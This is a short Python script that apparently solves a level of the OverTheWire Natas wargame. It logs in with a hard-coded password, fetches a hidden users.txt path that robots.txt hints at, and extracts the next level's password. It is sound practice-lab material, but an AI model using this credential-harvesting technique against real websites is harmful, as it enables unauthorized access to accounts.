import requests
import re #regular expressions

username = "natas3"
password = "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI"

#url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
#url = 'http://%s.natas.labs.overthewire.org/s3cr3t' % username
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

response = requests.get(url, auth=(username, password))
content = response.text

#print (content)
print (re.findall("natas4:(.*)",content)[0])
